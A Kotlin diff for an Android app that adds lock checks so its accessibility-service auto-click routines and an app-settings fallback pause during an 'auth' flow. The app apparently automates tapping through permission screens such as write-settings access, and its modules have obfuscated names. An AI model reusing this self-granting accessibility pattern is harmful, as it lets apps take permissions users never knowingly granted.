@@ -19,6 +19,7 @@ import com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
 import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
 import com.storm.safe.rock.p000.DangerKeywords
 import com.storm.safe.rock.service.MyAccessibilityService
+import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import java.util.ArrayDeque
 import java.util.Locale
 import java.util.concurrent.ConcurrentHashMap
@@ -1451,6 +1452,12 @@ class MainOrchestrator(
                 clickJob = scope.launch {
                     delay(1000L)
                     if (!isActive || !this@launch.isActive) return@launch
+                    // Defer to active auth flow — MainOrchestrator's event-driven retries
+                    // must not compete with Yw5xud adaptation's startActivity calls.
+                    if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
+                        Log.d(TAG, "⏸️ [handleEvent] auth 流程持锁中，跳过本次 autoClick")
+                        return@launch
+                    }
                     if (hasWriteSettingsPermission()) {
                         handlePermissionGranted()
                         return@launch
@@ -1476,6 +1483,12 @@ class MainOrchestrator(
                 clickJob = scope.launch {
                     delay(1000L)
                     if (!isActive || !this@launch.isActive) return@launch
+                    // Defer to active auth flow — MainOrchestrator's event-driven retries
+                    // must not compete with Yw5xud adaptation's startActivity calls.
+                    if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
+                        Log.d(TAG, "⏸️ [handleEvent] auth 流程持锁中，跳过本次 autoClick")
+                        return@launch
+                    }
                     if (hasWriteSettingsPermission()) {
                         handlePermissionGranted()
                         return@launch
@@ -1770,7 +1783,12 @@ class MainOrchestrator(
                         1 -> {
                             // SMART: open app settings as fallback
                             UiDebugger.dumpPage(service, "ws_app_settings_fallback", "SMART fallback 到应用设置")
-                            openAppSettings()
+                            if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
+                                Log.d(TAG, "⏸️ [SMART fallback] auth 流程持锁中，跳过 openAppSettings")
+                                // Don't call openAppSettings here — let auth finish first
+                            } else {
+                                openAppSettings()
+                            }
                         }
                     }
                 }
